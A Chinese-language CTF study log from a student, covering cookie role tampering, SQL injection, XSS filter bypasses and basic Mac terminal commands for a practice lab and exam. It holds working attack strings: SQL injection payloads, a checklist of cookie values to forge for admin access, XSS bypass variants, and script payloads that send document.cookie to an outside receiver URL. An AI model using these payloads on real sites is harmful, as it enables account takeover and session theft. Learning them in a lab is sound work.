# 2026-11-11 CTF学习记录

今天完成了 Web 安全基础实操：
1. **T11 Cookie越权**：通过 F12 修改 role=admin 骗过服务器，理解客户端数据不可信。
2. **T12 SQL注入**：使用 `x' OR 1=1 -- ` 闭合代码，爆出隐藏数据。
3. **T13 XSS**：验证了原样回显会导致代码执行，而转义回显是安全的。
4. **Mac终端操作**：学会了 cd 切换目录，用 ls 查看文件，用 Control+C 打断程序。
5. 1.Cookie:就是浏览器身上挂着的“小纸条（或者网吧的临时上网卡）”。
2. 什么是 Role（角色）？
Role 就是小纸条上写的内容之一，代表“你的身份”。
🦹‍♂️3.为什么要改成 admin（管理员）？
这就是 CTF 和黑客技术的核心：越权（伪造身份）。
1. 考试时，在 Cookie 里找什么字眼？（找锁）
打开开发者工具（F12）的 Application（应用）面板，看 Cookies 里的 Name（名字），寻找以下可疑关键词：
· 身份类：role、user_type、identity、group
· 权限类：is_admin、is_vip、is_staff、auth、access、level、power
· 状态类：login、logged_in、status、debug

 2. 找到之后，改成啥样的值？（配钥匙）

不要死认 admin 一个词，看你改的那个字段原本是什么值：

· 如果原本是英文单词（比如 role=student）：
  改成：admin、administrator、root、superadmin、staff
· 如果原本是数字 0/1（比如 is_admin=0）：
  改成：1 （在计算机里，1 通常代表 True/真/开启）
· 如果原本是布尔值（比如 is_admin=false）：
  改成：true、True
· 如果原本是等级（比如 level=1）：
  改成：99、999、100 （尝试很大的数字）
· 如果是用户 ID（比如 user_id=1001）：
  改成：1 或者 0 （系统管理员通常是 1 号或 0 号）

🏆 总结你的“万能解题直觉”

1. 遇到网站题，先登录一下。
2. 按下 F12，进 Application（应用） -> Cookies。
3. 像寻宝一样看有没有什么 admin、role、is_xxx 的字眼。
4. 只要有，双击改它的值，把“普通”改成“高级”，刷新。

SQL :就是一种“和数据库聊天的语言”。
你可以把数据库想象成一个巨大的 Excel 表格，里面存着所有的用户信息、商品、甚至隐藏的 Flag。

错误代码:# 用户搜索的名字（比如 apple）
name = input框里填的内容
# 把名字拼接到 SQL 指令里
查询指令 = "SELECT * FROM 商品表 WHERE 名字 = '" + name + "'"

给你一个网站，里面有个搜索框、或者登录框（输入账号密码）。你不知道怎么破，请立刻掏出这几把“万能钥匙”：

第一招：万能搜索/万能密码（神挡杀神）

· 在搜索框或者账号框输入：x' OR 1=1 --  （再次强调，横杠后面有个空格）
· 或者输入：admin' OR 1=1 -- 

第二招：如果提示格式不对，试试数字型

· 如果在 URL 里看到 ?id=1，试着改成 ?id=1 OR 1=1

第三招：注意看报错
如果你输入一个单引号 '，网页报错提示 SQL syntax error（语法错误），恭喜你，你中奖了！这说明它百分之百有 SQL 注入漏洞，赶紧上第一招。



XSS : 就是黑客往网页里“塞”了一段代码，当别人打开网页时，浏览器乖乖地把这段代码当成了真代码去执行。

场景一：题目有个“举报/反馈”按钮，或者有管理员审核（最常见）

考核题目可能会给你一个输入框，旁边写着：“管理员会定时查看你们的留言”。这说明你需要偷走管理员的 Cookie。

1. 你发现输入 <script>alert(1)</script> 能弹窗，说明有漏洞。
2. 你在这个网站注册个账号，登录进去，F12 发现你的 Cookie 里没有 Flag。
3. 关键操作：你输入一段恶意的代码，这段代码的作用不是弹窗，而是把管理员的 Cookie 发送到你的服务器。
   · 考核时你通常没有自己的服务器，学长可能会给你提供一个类似于 webhook.site 的网址，或者提供一个小工具来接收数据。
   · 你的输入可能是：<script>fetch('学长的接收网址/?cookie='+document.cookie)</script>（或者直接用 <script>location.href='接收网址/?cookie='+document.cookie</script>）。
4. 等待：你提交后，管理员（后台模拟机器人）去看了一眼你的留言，这段代码就在他的浏览器里执行了，他的 Cookie 就被发到了那个接收网址上。
5. 拿旗：你去那个接收网址看日志，看到了管理员发来的 Cookie（里面可能写着 admin=1 或者直接就是 flag{xxx}）。你把那个 Cookie 改到你自己的浏览器里，或者直接提交通道，拿到 Flag。

---

场景二：纯靠 JS 把本地的东西弹出来（送分题）

如果题目没有管理员，没有提交后台的按钮，仅仅只有个输入框。

1. 你发现能弹窗，这本身就是得分点。
2. 操作：试试把弹窗的内容改成读取 Cookie，直接看有没有。
   输入：<script>alert(document.cookie)</script>
   如果弹窗里出现了 flag{xxxxx}，直接复制提交！考核完事。

场景三：有“过滤”机制（考绕过）

如果考核的时候，你输入 <script> 没弹窗，反而网页显示空白，或者提示“检测到非法字符”，说明学长加了“防火墙”（过滤了 <script>）。

这时候你要学会变形绕过。考核时不用懂原理，直接试下面这三个“备胎”代码：

1. 大小写绕过：<sCript>alert(1)</sCript>
2. 图片欺骗绕过（最常用，遇到过滤 script 时用这个）：< img src=1 onerror=alert(1)>
   (意思是：加载一张损坏的图片，加载失败时执行 alert(1))
3. 双写绕过（如果它把 script 删掉了）：<scr<script>ipt>alert(1)</script>

💡 总结你的“考核实战流程”：

考核遇到 XSS 题，牢记这三步：

1. 探路：输入 <script>alert(1)</script>。
2. 判断：看题目描述（有没有管理员？需不需要提交链接？）。
3. 杀招：
   · 如果有管理员，用 <script>location.href='你的接收网址/?c='+document.cookie</script> 偷 Cookie。
   · 如果只是个简单题，用 <script>alert(document.cookie)</script> 看看能不能直接弹出来。

不过，基于学长发给你的 web_lab.py，他大概率不会在考核里搞那么复杂的“偷管理员 Cookie”的后台。考核大概率只会让你证明：“原样回显”有漏洞，“转义回显”没漏洞，让你把原理写在报告里。

你现在只需要记住：XSS = 别人写的代码，在你的浏览器里执行了
🎯 终端实战总结（背诵版）

考核那天，如果你拿到一个包含 xxx.py 的文件，你的标准操作流是这 4 步：

1. 找路：终端输入 cd （加个空格），把文件夹拖进去，回车。
2. 确认：输入 ls，看看文件是不是都在。
3. 开跑：输入 python3 你的脚本名.py。
4. 如果卡住了想停：按 Control + C。
